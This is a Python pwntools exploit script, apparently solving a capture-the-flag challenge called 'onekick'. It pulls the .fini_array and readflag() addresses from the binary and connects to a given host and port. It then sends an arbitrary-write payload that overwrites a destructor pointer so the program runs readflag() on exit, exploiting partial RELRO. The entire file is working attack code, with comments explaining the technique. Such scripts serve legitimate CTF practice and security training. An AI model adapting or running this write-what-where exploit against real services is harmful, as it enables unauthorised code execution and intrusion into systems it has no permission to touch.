#!/usr/bin/env python3

from pwn import *
import sys
import os

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port> [binary_path]")
        print("  binary_path is optional - if provided, addresses will be extracted from it")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    binary_path = sys.argv[3] if len(sys.argv) > 3 else None
    
    # Try to extract addresses from binary if provided
    fini_array_addr = None
    readflag_addr = None
    
    if binary_path and os.path.exists(binary_path):
        try:
            elf = ELF(binary_path)
            readflag_addr = elf.symbols['readflag']
            
            # Find .fini_array section
            # .fini_array contains pointers to destructor functions
            # With partial RELRO (-z relro without -z now), .fini_array is writable
            fini_array = elf.get_section_by_name('.fini_array')
            if fini_array:
                fini_array_addr = fini_array['sh_addr']
                print(f"[*] Loaded binary: {binary_path}")
                print(f"[*] .fini_array address: {hex(fini_array_addr)}")
                print(f"[*] readflag(): {hex(readflag_addr)}")
            else:
                # Try to find it manually
                print("[-] Could not find .fini_array section")
                print("[-] Try: readelf -S onekick | grep fini_array")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Error loading binary: {e}")
            print("[-] You can extract addresses manually:")
            print("    readelf -S onekick | grep fini_array")
            print("    objdump -t onekick | grep readflag")
            sys.exit(1)
    else:
        # Try common locations
        possible_paths = [
            './onekick',
            './src/onekick',
            '../src/onekick',
            'onekick-bundle.tgz'
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                try:
                    if path.endswith('.tgz'):
                        # Would need to extract first
                        continue
                    elf = ELF(path)
                    readflag_addr = elf.symbols['readflag']
                    fini_array = elf.get_section_by_name('.fini_array')
                    if fini_array:
                        fini_array_addr = fini_array['sh_addr']
                        print(f"[*] Found binary: {path}")
                        print(f"[*] .fini_array address: {hex(fini_array_addr)}")
                        print(f"[*] readflag(): {hex(readflag_addr)}")
                        break
                except:
                    continue
    
    if fini_array_addr is None or readflag_addr is None:
        print("[-] Could not find addresses. Please provide binary path or extract manually:")
        print("    readelf -S onekick | grep fini_array")
        print("    objdump -t onekick | grep readflag")
        print("    Then modify this script to use the addresses directly.")
        sys.exit(1)
    
    # Connect to the service
    print(f"[*] Connecting to {host}:{port}")
    conn = remote(host, port)
    
    # Build payload: 8 bytes address (.fini_array) + 8 bytes value (readflag address)
    # .fini_array contains function pointers that are called on exit
    # We overwrite the first entry to point to readflag()
    payload = p64(fini_array_addr) + p64(readflag_addr)
    
    print(f"[*] Sending payload...")
    conn.send(payload)
    
    # Receive the flag
    print(f"[*] Receiving flag...")
    try:
        flag = conn.recvall(timeout=2)
        print(flag.decode('utf-8', errors='ignore'))
    except:
        print("[-] No response received")
    
    conn.close()

if __name__ == '__main__':
    main()
